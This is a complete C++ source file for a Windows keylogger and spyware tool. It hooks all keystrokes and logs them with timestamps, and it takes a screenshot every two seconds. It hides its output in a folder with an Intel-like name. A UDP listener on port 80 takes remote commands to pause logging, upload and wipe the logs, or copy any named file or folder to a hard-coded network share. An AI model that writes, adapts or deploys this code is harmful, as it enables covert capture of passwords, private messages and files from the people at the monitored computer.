#include <windows.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <iomanip>
#include <gdiplus.h>
#include <thread>
#include <Shlobj.h>
#include <stdio.h>
#include <time.h>
#include <string>
#include <codecvt>   // For std::codecvt_utf8
#include <locale>    // For std::wstring_convert
#include <PathCch.h>
#include <mutex>
#include <Shellapi.h>
#define MAX_PATH 260
#define _WINSOCK_DEPRECATED_NO_WARNINGS

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void Save(const char* text);
void CaptureScreenAndSave();
void listenThread();
void sendThread();
void copyThread(const char* path, const wchar_t* destPath);
void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath);
void deleteFile(const std::wstring& filePath);

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

HHOOK hHook = NULL;
bool newLinePending = false;
bool isNewLine = true;
bool on = true;
std::wstring directoryPath = L"C:\\ProgramData\\Intel\\AGS\\Temp\\Logs\\";
std::wstring remotePath = L"\\\\192.168.100.123\\Compare\\";

int main() {
    if (SHCreateDirectoryEx(NULL, directoryPath.c_str(), NULL)) {
        std::wcout << L"Already exist or something wrong " << directoryPath << std::endl;
    }
    else {
        std::wcerr << L"Directory created: " << directoryPath << std::endl;
    }
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (hHook == NULL) {
        std::cerr << "Failed to set hook\n";
        return 1;
    }

    UINT_PTR timerId = SetTimer(NULL, 0, 2000, (TIMERPROC)CaptureScreenAndSave);
    if (timerId == 0) {
        std::cerr << "Failed to set up timer\n";
        return 1;
    }

    std::thread t(listenThread);  // Create a thread

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    KillTimer(NULL, timerId);

    return 0;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && on) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        bool isSpecialKey = false;
        char key[16] = { 0 };

        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
            switch (vkCode) {
            case VK_RETURN:
                strcpy_s(key, " &Return\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_ESCAPE:
                strcpy_s(key, " &Esc\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_SPACE:
                strcpy_s(key, " ");
                isSpecialKey = true;
                break;
            case VK_BACK:
                strcpy_s(key, " &BackSpace\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_TAB:
                strcpy_s(key, " &Tab\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_DELETE:
                strcpy_s(key, " &Delete\n");
                isSpecialKey = true;
                newLinePending = true;
                break;
            case VK_UP:
                strcpy_s(key, " &Up ");
                isSpecialKey = true;
                break;
            case VK_DOWN:
                strcpy_s(key, " &Down ");
                isSpecialKey = true;
                break;
            case VK_LEFT:
                strcpy_s(key, " &Left ");
                isSpecialKey = true;
                break;
            case VK_RIGHT:
                strcpy_s(key, " &Right ");
                isSpecialKey = true;
                break;
            case VK_PRIOR:
                strcpy_s(key, " &PageUp ");
                isSpecialKey = true;
                break;
            case VK_NEXT:
                strcpy_s(key, " &PageDown ");
                isSpecialKey = true;
                break;
            case VK_HOME:
                strcpy_s(key, " &Home ");
                isSpecialKey = true;
                break;
            case VK_END:
                strcpy_s(key, " &End ");
                isSpecialKey = true;
                break;
            case 0xBA:
                strcpy_s(key, shiftPressed ? ":" : ";");
                isSpecialKey = true;
                break;
            case 0xBB:
                strcpy_s(key, shiftPressed ? "+" : "=");
                isSpecialKey = true;
                break;
            case 0xBC:
                strcpy_s(key, shiftPressed ? "<" : ",");
                isSpecialKey = true;
                break;
            case 0xBD:
                strcpy_s(key, shiftPressed ? "_" : "-");
                isSpecialKey = true;
                break;
            case 0xBE:
                strcpy_s(key, shiftPressed ? ">" : ".");
                isSpecialKey = true;
                break;
            case 0xBF:
                strcpy_s(key, shiftPressed ? "?" : "/");
                isSpecialKey = true;
                break;
            case 0xC0:
                strcpy_s(key, shiftPressed ? "~" : "`");
                isSpecialKey = true;
                break;
            case 0xDB:
                strcpy_s(key, shiftPressed ? "{" : "[");
                isSpecialKey = true;
                break;
            case 0xDC:
                strcpy_s(key, shiftPressed ? "|" : "\\");
                isSpecialKey = true;
                break;
            case 0xDD:
                strcpy_s(key, shiftPressed ? "}" : "]");
                isSpecialKey = true;
                break;
            case 0xDE:
                strcpy_s(key, shiftPressed ? "\"" : "'");
                isSpecialKey = true;
                break;
            default:
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);

                int result = ToAscii(vkCode, kbdStruct->scanCode, keyboardState, (LPWORD)key, 0);
                if (result == 1 || result == 2) {
                    if (isprint(key[0]) || key[0] == '\t' || key[0] == '\n') {
                        if (shiftPressed) {
                            if (isalpha(key[0]) || ispunct(key[0])) {
                                key[0] = toupper(key[0]);
                            }
                            else if (key[0] == '1') {
                                strcpy_s(key, "!");
                            }
                            else if (key[0] == '2') {
                                strcpy_s(key, "@");
                            }
                            else if (key[0] == '3') {
                                strcpy_s(key, "#");
                            }
                            else if (key[0] == '4') {
                                strcpy_s(key, "$");
                            }
                            else if (key[0] == '5') {
                                strcpy_s(key, "%");
                            }
                            else if (key[0] == '6') {
                                strcpy_s(key, "^");
                            }
                            else if (key[0] == '7') {
                                strcpy_s(key, "&");
                            }
                            else if (key[0] == '8') {
                                strcpy_s(key, "*");
                            }
                            else if (key[0] == '9') {
                                strcpy_s(key, "(");
                            }
                            else if (key[0] == '0') {
                                strcpy_s(key, ")");
                            }
                        }
                    }
                }
                break;
            }
        }

        if (isSpecialKey || key[0] != '\0') {
            Save(key);
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
std::mutex fileMutex;
void Save(const char* text) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directoryPath + L"*.txt").c_str(), &findFileData);
    std::wstring findname = L"";
    wchar_t filename[MAX_PATH];

    if (hFind != INVALID_HANDLE_VALUE) {
        // Found the first .txt file, return its filename
        findname = directoryPath + findFileData.cFileName;
        wcsncpy(filename, findname.c_str(), MAX_PATH);
        FindClose(hFind); // Close the search handle
    }
    else {
        time_t now = time(nullptr);
        tm localTime;
        localtime_s(&localTime, &now);
        swprintf_s(filename, MAX_PATH, (directoryPath + L"%02d%02d%02d%02d%02d.txt").c_str(), localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);
    }

    HANDLE hFile = CreateFileW(
        filename,
        FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        if (isNewLine) {
            std::lock_guard<std::mutex> lock(fileMutex);
            auto now = std::chrono::system_clock::now();
            std::time_t now_c = std::chrono::system_clock::to_time_t(now);

            std::tm* ptm = std::localtime(&now_c);
            char timestamp[32];
            std::strftime(timestamp, sizeof(timestamp), "[%Y-%m-%d %H:%M:%S] ", ptm);

            std::string logEntry = timestamp + std::string(text);

            DWORD written;
            WriteFile(hFile, logEntry.c_str(), logEntry.size(), &written, NULL);
            isNewLine = false;
        }
        else {
            DWORD written;
            WriteFile(hFile, text, strlen(text), &written, NULL);
        }

        if (newLinePending) {
            isNewLine = true;
            newLinePending = false;
        }

        CloseHandle(hFile);
    }
    else {
        std::cerr << "Failed to open remote file\n";
    }
}

void CaptureScreenAndSave() {
    if (!on)
        return;
    wchar_t filename[MAX_PATH];

    time_t now = time(nullptr);
    tm localTime;
    localtime_s(&localTime, &now);
    swprintf_s(filename, MAX_PATH, (directoryPath + L"%02d%02d%02d%02d%02d.jpg").c_str(), localTime.tm_mon + 1, localTime.tm_mday, localTime.tm_hour, localTime.tm_min, localTime.tm_sec);

    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HWND desktop = GetDesktopWindow();
    HDC desktopdc = GetDC(desktop);
    HDC mydc = CreateCompatibleDC(desktopdc);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP mybmp = CreateCompatibleBitmap(desktopdc, width, height);
    HBITMAP oldbmp = (HBITMAP)SelectObject(mydc, mybmp);
    BitBlt(mydc, 0, 0, width, height, desktopdc, 0, 0, SRCCOPY | CAPTUREBLT);
    SelectObject(mydc, oldbmp);

    bool defaultfn = false;
    wchar_t format[5] = L"jpeg";
    wchar_t encoder[16] = L"image/jpeg";
    long quality = 30;

    Bitmap* b = Bitmap::FromHBITMAP(mybmp, NULL);
    CLSID encoderClsid;
    EncoderParameters encoderParameters;
    Status stat = GenericError;

    wcsncpy_s(encoder + wcslen(L"image/"), 16 - wcslen(L"image/"), format, _TRUNCATE);

    if (b)
    {
        if (GetEncoderClsid(encoder, &encoderClsid) != -1)
        {
            if (quality >= 0 && quality <= 100 && wcscmp(encoder, L"image/jpeg") == 0)
            {
                encoderParameters.Count = 1;
                encoderParameters.Parameter[0].Guid = EncoderQuality;
                encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
                encoderParameters.Parameter[0].NumberOfValues = 1;
                encoderParameters.Parameter[0].Value = &quality;

                stat = b->Save(filename, &encoderClsid, &encoderParameters);
            }
            else
                stat = b->Save(filename, &encoderClsid, NULL);
        }

        delete b;
    }

    GdiplusShutdown(gdiplusToken);
    ReleaseDC(desktop, desktopdc);
    DeleteObject(mybmp);
    DeleteDC(mydc);
    return;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT  num = 0;
    UINT  size = 0;

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

void listenThread() {
    int error = 0;
    const char* port = "80";
    unsigned long ipaddr = INADDR_ANY;

    //init socket
    WSADATA wsaData;
    WORD socketVersion = MAKEWORD(2, 2);
    if (WSAStartup(socketVersion, &wsaData) != 0)
    {
        //printf("socket error occured");
        return;
    }
    SOCKET msocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    sockaddr_in msocktaddr;
    msocktaddr.sin_family = AF_INET;
    msocktaddr.sin_port = htons(atoi(port));
    msocktaddr.sin_addr.S_un.S_addr = ipaddr;

    //bind port
    if (bind(msocket, (sockaddr*)&msocktaddr, sizeof(msocktaddr)) == SOCKET_ERROR) {
        //printf("socket bind error !");
        closesocket(msocket);
        return;
    }

    //init
    time_t now;
    struct tm tmTmp;
    char buffer[10];
    sockaddr_in msocktaddr_remote;
    int maddrlen_remote = sizeof(msocktaddr_remote);
    int num = 0;
    char recvdata[255];
    int ret;

    while (1)
    {
        ret = recvfrom(msocket, recvdata, 255, 0, (sockaddr*)&msocktaddr_remote, &maddrlen_remote);
        if (ret > 0)
        {
            time(&now);
            localtime_s(&tmTmp, &now);
            strftime(buffer, 10, "%H:%M:%S", &tmTmp);

            num++;
            recvdata[ret] = 0x00;
            //printf("[%03d] %s\t%s\n", num, buffer, recvdata);
            if (strcmp(recvdata, "1") == 0) {
                // start service
                on = true;
            }
            else if (strcmp(recvdata, "2") == 0) {
                // stop service
                on = false;
            }
            else if (strcmp(recvdata, "3") == 0) {
                // send & delete thread
                on = false;
                std::thread st(sendThread);  // Create a thread
                st.join();
                on = true;
            }
            else if (strcmp(recvdata, "4") == 0) {
                // send & delete & stop thread
                on = false;
                std::thread st(sendThread);  // Create a thread
                st.join();
            }
            else {
                // copy data
                std::thread ft(copyThread, recvdata, remotePath.c_str());  // Create a thread
                ft.join();
            }
        }
    }
    closesocket(msocket);
    WSACleanup();
    return;
}

void sendThread() {
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;

    // Find the first file in the directory
    hFind = FindFirstFile((directoryPath + L"*").c_str(), &FindFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        std::cerr << "FindFirstFile failed: " << GetLastError() << std::endl;
        return;
    }
    do {
        // Skip directories
        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring localFilePath = directoryPath + FindFileData.cFileName;
            std::wstring remoteFilePath = remotePath + FindFileData.cFileName;

            // Send file to remote server
            sendFileToRemote(localFilePath, remoteFilePath);

            // Delete file from local directory after sending
            deleteFile(localFilePath);
        }
    } while (FindNextFile(hFind, &FindFileData) != 0);

    // Close handle after finished
    FindClose(hFind);

    return;
}

void copyThread(const char* path, const wchar_t* destPath) {
    // Convert char* path to UTF-16 std::wstring
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>, wchar_t> converter;
    std::wstring widePath = converter.from_bytes(path);

    // Ensure destPath ends with backslash if it's a folder
    std::wstring remotePathWithBackslash(destPath);
    if (!remotePathWithBackslash.empty() && remotePathWithBackslash.back() != L'\\') {
        remotePathWithBackslash.push_back(L'\\');
    }

    DWORD dwAttrib = GetFileAttributesW(widePath.c_str());
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "Invalid path: " << GetLastError() << std::endl;
        return;
    }

    // Check if path is a file or directory
    if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
        // If it's a directory, proceed with existing functionality
        // Append "\\*" to the path to find all files and directories in the directory
        std::wstring searchPath = widePath + L"\\*";

        WIN32_FIND_DATAW FindFileData;
        HANDLE hFind;

        // Find the first file or directory in the specified directory
        hFind = FindFirstFileW(searchPath.c_str(), &FindFileData);
        if (hFind == INVALID_HANDLE_VALUE) {
            std::cerr << "FindFirstFile failed: " << GetLastError() << std::endl;
            return;
        }

        do {
            // Skip current directory (.) and parent directory (..)
            if (wcscmp(FindFileData.cFileName, L".") == 0 || wcscmp(FindFileData.cFileName, L"..") == 0) {
                continue;
            }

            // Construct full path of the current file or directory
            std::wstring currentFilePath = widePath + L"\\" + FindFileData.cFileName;

            if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // If it's a directory, recursively call copyThread on this directory
                std::wstring newRemoteDir = remotePathWithBackslash + FindFileData.cFileName;
                if (!CreateDirectoryW(newRemoteDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
                    std::cerr << "Failed to create directory: " << GetLastError() << std::endl;
                }
                else {
                    copyThread(converter.to_bytes(currentFilePath).c_str(), newRemoteDir.c_str());
                }
            }
            else {
                // If it's a file, send file to remote server
                std::wstring remoteFilePath = remotePathWithBackslash + FindFileData.cFileName;
                sendFileToRemote(currentFilePath, remoteFilePath);
                std::wcout << L"Copying file: " << currentFilePath << L" to " << remoteFilePath << std::endl;
            }

        } while (FindNextFileW(hFind, &FindFileData) != 0);

        // Close handle after finished
        FindClose(hFind);
    }
    else {
        // If it's a file, directly copy it to remotePath
        std::wstring fileName = widePath.substr(widePath.find_last_of(L"\\") + 1);
        std::wstring remoteFilePath = remotePathWithBackslash + fileName;
        sendFileToRemote(widePath, remoteFilePath);
        std::wcout << L"Copying file: " << widePath << L" to " << remoteFilePath << std::endl;
    }
}


void sendFileToRemote(const std::wstring& localPath, const std::wstring& remotePath) {
    // Example: Use CopyFile function to copy file to remote server directory
    if (!CopyFile(localPath.c_str(), remotePath.c_str(), FALSE)) {
        std::cerr << "Failed to copy file: " << GetLastError() << std::endl;
    }
}

void deleteFile(const std::wstring& filePath) {
    // Example: Use DeleteFile function to delete file from local directory
    if (!DeleteFile(filePath.c_str())) {
        std::cerr << "Failed to delete file: " << GetLastError() << std::endl;
    }
}

